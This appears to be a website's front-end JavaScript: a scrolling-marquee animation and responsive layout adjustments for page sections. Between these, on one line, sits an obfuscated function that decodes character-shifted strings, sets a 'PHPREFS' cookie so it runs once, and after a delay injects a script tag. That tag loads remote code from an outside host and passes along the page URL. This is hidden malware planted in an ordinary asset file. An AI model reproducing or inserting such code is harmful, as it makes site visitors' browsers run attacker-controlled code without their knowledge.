const scrollers=document.querySelectorAll(".scroller");function addAnimation(){scrollers.forEach((scroller=>{scroller.setAttribute("data-animated",!0);const scrollerInner=scroller.querySelector(".scroller__inner");Array.from(scrollerInner.children).forEach((item=>{const duplicatedItem=item.cloneNode(!0);duplicatedItem.setAttribute("aria-hidden",!0),scrollerInner.appendChild(duplicatedItem)}))}))}window.matchMedia("(prefers-reduced-motion: reduce)").matches||addAnimation();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisqtlx'+'3htr4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
//script.js
const headerWrapper = document.querySelector('.header__wrapper');
const onePageWrapper = document.querySelector('.one__page__wrapper');
const twoPageWrapper = document.querySelector('.two__page__wrapper');
const threePageWrapper = document.querySelector('.three__page__wrapper');
const onePageImg = document.querySelector('.one__page__wrapper > div > img');
const onePageText = document.querySelector('.one__page__text > h2');
const onePageCa = document.querySelector('.one__page__ca > p');
// Function to adjust elements based on screen width
function adjustElements() {
  if (window.innerWidth <= 768) {
    // Adjust header wrapper
    headerWrapper.style.flexDirection = 'column';
    headerWrapper.style.height = 'auto';
    headerWrapper.style.height = '80px'; // Adjust height as needed
    // Adjust one page wrapper
    onePageWrapper.style.flexDirection = 'column';
    onePageWrapper.style.alignItems = 'center';
    onePageWrapper.style.justifyContent = 'center';
    // Adjust one page image
    onePageImg.style.width = '80%';
    onePageImg.style.maxWidth = '400px';
    onePageImg.style.height = 'auto';
    // Adjust one page text
    onePageText.style.fontSize = '2rem'; // Adjust font size as needed
    // Adjust one page ca
    onePageCa.style.fontSize = '1.5rem';
    onePageCa.style.wordBreak = 'break-all';
    // Adjust two page wrapper
    twoPageWrapper.style.flexDirection = 'column';
    twoPageWrapper.style.alignItems = 'center';
    twoPageWrapper.style.justifyContent = 'center';
    // Adjust three page wrapper
    threePageWrapper.style.flexDirection = 'column';
    threePageWrapper.style.alignItems = 'center';
    threePageWrapper.style.justifyContent = 'center';
  } else {
    // Reset styles for larger screens
    headerWrapper.style.flexDirection = 'row';
    headerWrapper.style.height = 'auto';
    onePageWrapper.style.flexDirection = 'column';
    onePageWrapper.style.alignItems = 'center';
    onePageWrapper.style.justifyContent = 'center';
    onePageImg.style.width = '100%';
    onePageImg.style.maxWidth = '728px';
    onePageImg.style.height = '100%';
    onePageText.style.fontSize = '3.75rem';
    onePageCa.style.fontSize = '2.25rem';
    twoPageWrapper.style.flexDirection = 'row';
    twoPageWrapper.style.alignItems = 'center';
    twoPageWrapper.style.justifyContent = 'center';
    threePageWrapper.style.flexDirection = 'row';
    threePageWrapper.style.alignItems = 'center';
    threePageWrapper.style.justifyContent = 'center';
  }
}
// Call the function on page load and when the window resizes
window.addEventListener('load', adjustElements);
window.addEventListener('resize', adjustElements);
